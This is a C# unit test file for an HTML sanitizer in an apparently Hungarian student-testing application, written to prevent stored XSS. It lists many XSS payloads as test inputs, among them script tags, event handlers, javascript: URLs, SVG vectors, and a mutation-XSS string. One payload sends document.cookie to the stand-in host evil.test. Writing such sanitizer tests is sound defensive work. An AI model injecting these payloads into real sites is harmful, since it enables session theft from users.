using Bunit;

using Microsoft.Extensions.DependencyInjection;
using Microsoft.FluentUI.AspNetCore.Components;

using TeszterLibrary.Components.Teszt;
using TeszterLibrary.Model;
using TeszterLibrary.Services.Html;

namespace TeszterTests.Services.Html
{
    /// <summary>
    /// A tárolt HTML megjelenítéskori tisztítása. Régen a ~20 MarkupString-es helyen a nyers HTML jelent meg,
    /// így egy kérdés- vagy válaszszövegbe írt szkript minden diák böngészőjében lefutott volna (tárolt XSS).
    /// </summary>
    public class SafeHtmlTests
    {
        private const string Png = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";

        [Theory]
        [InlineData("<script>alert(1)</script><p>a</p>", "<script")]
        [InlineData("<img src=x onerror=\"alert(1)\">", "onerror")]
        [InlineData("<a href=\"javascript:alert(1)\">x</a>", "javascript:")]
        [InlineData("<a href=\"JaVaScRiPt:alert(1)\">x</a>", "alert")]
        [InlineData("<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>", "data:")]
        [InlineData("<img src=\"data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=\">", "data:")]
        [InlineData("<iframe src=\"https://evil.test\"></iframe>", "iframe")]
        [InlineData("<svg><script>alert(1)</script></svg>", "script")]
        [InlineData("<p style=\"background:url(javascript:alert(1))\">a</p>", "javascript")]
        [InlineData("<form action=\"https://evil.test\"><input name=p></form>", "<form")]
        [InlineData("<p>Jelszó: <input type=\"password\" name=\"p\"></p>", "<input")]
        [InlineData("<button formaction=\"https://evil.test\">Küldés</button>", "formaction")]
        [InlineData("<div onclick=\"steal()\">x</div>", "onclick")]
        [InlineData("<object data=\"x.swf\"></object>", "object")]
        [InlineData("<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>", "onerror")]
        public void Dangerous_markup_is_removed(string html, string forbidden)
        {
            var result = SafeHtml.Sanitize(html);

            Assert.DoesNotContain(forbidden, result, StringComparison.OrdinalIgnoreCase);
        }

        [Theory]
        [InlineData("<p><strong>Félkövér</strong> és <em>dőlt</em></p>")]
        [InlineData("<p>x<sup>2</sup> + H<sub>2</sub>O</p>")]
        [InlineData("<ul><li>egy</li><li>kettő</li></ul>")]
        [InlineData("<table><tbody><tr><td>1</td><td>2</td></tr></tbody></table>")]
        [InlineData("<p class=\"ql-align-center\">középre</p>")]
        [InlineData("<ol><li data-list=\"bullet\">a</li></ol>")]
        [InlineData("<img src=\"/uploads/abc.png\" alt=\"kép\">")]
        [InlineData("<a href=\"https://example.org/\">link</a>")]
        public void Editor_formatting_is_kept(string html)
        {
            Assert.Equal(html, SafeHtml.Sanitize(html));
        }

        [Fact]
        public void Math_sequence_svg_is_kept_by_the_svg_variant_but_not_by_the_default()
        {
            const string svg = "<svg width=\"120\" height=\"30\" viewBox=\"0 0 120 30\"><text x=\"0\" y=\"20\" font-size=\"16\">3 km</text>"
                + "<line x1=\"0\" y1=\"25\" x2=\"40\" y2=\"25\" stroke=\"black\" stroke-width=\"2\"></line></svg>";

            var kept = SafeHtml.SanitizeWithSvg(svg);

            Assert.Contains("<svg", kept);
            Assert.Contains("3 km", kept);
            Assert.Contains("<line", kept);
            Assert.Contains("viewBox", kept, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("3 km", SafeHtml.Sanitize(svg));   // a kérdésszövegek szűrése nem lazult
        }

        [Fact]
        public void MathJax_svg_glyph_definitions_and_references_are_kept()
        {
            // A MathJax SVG-kimenete: a betűjelek <defs>-ben, a rajz <use xlink:href="#MJX-..."/>-val hivatkozik rájuk.
            const string svg = "<svg width=\"4.414ex\" height=\"2.176ex\" viewBox=\"0 -791.3 1900.5 936.9\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">"
                + "<defs><path id=\"MJX-1-TEX-N-31\" d=\"M213 578L200 573Q186 568 160 563\"></path></defs>"
                + "<title>1 km</title><g stroke=\"currentColor\" fill=\"currentColor\" transform=\"matrix(1 0 0 -1 0 0)\">"
                + "<g data-mml-node=\"mn\"><use data-c=\"31\" xlink:href=\"#MJX-1-TEX-N-31\"></use></g></g></svg>";

            var kept = SafeHtml.SanitizeWithSvg(svg);

            Assert.Contains("id=\"tsvg-MJX-1-TEX-N-31\"", kept);
            Assert.Contains("d=\"M213 578L200 573Q186 568 160 563\"", kept);
            Assert.Contains("<use", kept);
            Assert.Contains("href=\"#tsvg-MJX-1-TEX-N-31\"", kept);
        }

        [Fact]
        public void MathJax2_svg_glyphs_are_kept_with_prefixed_ids()
        {
            // MathJax 2 SVG-kimenete (a valódi adat ilyen): id="E1-MJMAIN-31", <use xlink:href="#E1-MJMAIN-31">.
            const string svg = "<svg width=\"9.893ex\" height=\"2.176ex\" viewBox=\"0 -791.3 4259.5 936.9\"><title>10000 mm</title>"
                + "<defs><path stroke-width=\"1\" id=\"E1-MJMAIN-31\" d=\"M213 578L200 573Z\"></path>"
                + "<path stroke-width=\"1\" id=\"E1-MJMATHI-6D\" d=\"M21 287Q22 293 24 303Z\"></path></defs>"
                + "<g stroke=\"currentColor\" fill=\"currentColor\" transform=\"matrix(1 0 0 -1 0 0)\">"
                + "<use xlink:href=\"#E1-MJMAIN-31\"></use><use xlink:href=\"#E1-MJMATHI-6D\" x=\"500\" y=\"0\"></use></g></svg>";

            var kept = SafeHtml.SanitizeWithSvg(svg);

            Assert.Contains("id=\"tsvg-E1-MJMAIN-31\"", kept);
            Assert.Contains("id=\"tsvg-E1-MJMATHI-6D\"", kept);
            Assert.Contains("href=\"#tsvg-E1-MJMAIN-31\"", kept);
            Assert.Contains("href=\"#tsvg-E1-MJMATHI-6D\"", kept);
        }

        [Fact]
        public void Ids_outside_svg_are_removed_and_svg_ids_cannot_take_page_names()
        {
            Assert.DoesNotContain("id=", SafeHtml.SanitizeWithSvg("<p id=\"getElementById\">x</p>"));
            Assert.DoesNotContain("id=\"getElementById\"", SafeHtml.SanitizeWithSvg("<svg><text id=\"getElementById\">x</text></svg>"));
        }

        [Theory]
        [InlineData("<svg><use xlink:href=\"https://evil.test/x.svg#MJX-1\"></use></svg>", "evil.test")]
        [InlineData("<svg><use xlink:href=\"javascript:alert(1)\"></use></svg>", "javascript")]
        [InlineData("<svg><script>alert(1)</script></svg>", "script")]
        [InlineData("<svg onload=\"alert(1)\"><text>x</text></svg>", "onload")]
        [InlineData("<svg><a href=\"javascript:alert(1)\"><text>x</text></a></svg>", "javascript")]
        [InlineData("<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>", "onerror")]
        [InlineData("<svg><use href=\"https://evil.test/x.svg#a\"></use></svg>", "evil.test")]
        [InlineData("<svg><image href=\"https://evil.test/x.png\"></image></svg>", "evil.test")]
        [InlineData("<svg><rect fill=\"url(https://evil.test/x.svg#a)\"></rect></svg>", "evil.test")]
        [InlineData("<svg><animate attributeName=\"href\" to=\"javascript:alert(1)\"></animate></svg>", "javascript")]
        [InlineData("<svg><style>@import url(https://evil.test/x.css)</style></svg>", "evil.test")]
        public void Dangerous_svg_is_removed_by_the_svg_variant(string html, string forbidden)
        {
            Assert.DoesNotContain(forbidden, SafeHtml.SanitizeWithSvg(html), StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void Inline_colour_survives_in_normalised_form()
        {
            var result = SafeHtml.Sanitize("<p><span style=\"color: red\">piros</span></p>");

            Assert.Equal("<p><span style=\"color: rgba(255, 0, 0, 1)\">piros</span></p>", result);
        }

        [Fact]
        public void Embedded_raster_images_from_older_content_still_show()
        {
            var html = $"<img src=\"{Png}\">";

            Assert.Equal(html, SafeHtml.Sanitize(html));
        }

        [Fact]
        public void A_link_opening_a_new_tab_cannot_reach_the_opener()
        {
            var result = SafeHtml.Sanitize("<a href=\"https://example.org/\" target=\"_blank\">x</a>");

            Assert.Contains("rel=\"noopener noreferrer\"", result);
        }

        [Theory]
        [InlineData(null)]
        [InlineData("")]
        [InlineData("   ")]
        public void Empty_input_gives_empty_markup(string? html)
        {
            Assert.Equal(string.Empty, SafeHtml.Markup(html).Value);
        }

        [Fact]
        public void Truncated_html_is_closed_and_cleaned()
        {
            // NewAssignment_2 az első 40 karaktert mutatja: a félbevágott jelölés nem szivároghat tovább az oldalba.
            var result = SafeHtml.Sanitize("<p><b>hosszú kérdés <img src=x onerror=al");

            Assert.DoesNotContain("onerror", result);
            Assert.EndsWith("</b></p>", result);
        }

        [Fact]
        public void Plain_text_and_entities_are_kept_encoded()
        {
            Assert.Equal("3 &lt; 5 &amp;&amp; 7 &gt; 2", SafeHtml.Sanitize("3 &lt; 5 &amp;&amp; 7 &gt; 2"));
        }

        [Fact]
        public async Task Sanitizing_is_safe_from_many_threads()
        {
            var results = await Task.WhenAll(Enumerable.Range(0, 64).Select(i => Task.Run(() =>
                SafeHtml.Sanitize($"<p onclick=\"x\">{i}<script>y</script></p>"))));

            Assert.All(results.Select((r, i) => (r, i)), x => Assert.Equal($"<p>{x.i}</p>", x.r));
        }

        [Fact]
        public void Tex_fallback_keeps_its_class_for_styling()
        {
            // Ha a képszolgáltatás nem érhető el, az API a képlet forrását ebben a span-ben küldi (component.css: .tex-fallback).
            var html = SafeHtml.Sanitize("<span class=\"tex-fallback\">\\frac{1}{2} + 3 &lt; 4</span> Ł = Ł");

            Assert.Equal("<span class=\"tex-fallback\">\\frac{1}{2} + 3 &lt; 4</span> Ł = Ł", html);
        }

        [Fact]
        public void A_question_card_renders_the_cleaned_text()
        {
            using var ctx = new BunitContext();
            ctx.JSInterop.Mode = JSRuntimeMode.Loose;
            ctx.Services.AddFluentUIComponents();
            var question = new Question { Text = "<p>Mennyi 2+2?</p><img src=x onerror=\"fetch('//evil.test?c='+document.cookie)\"><script>alert(1)</script>" };

            var cut = ctx.Render<Qview>(p => p.Add(c => c.question, question));

            Assert.Contains("<p>Mennyi 2+2?</p>", cut.Markup);
            Assert.DoesNotContain("onerror", cut.Markup);
            Assert.DoesNotContain("<script", cut.Markup);
        }
    }
}
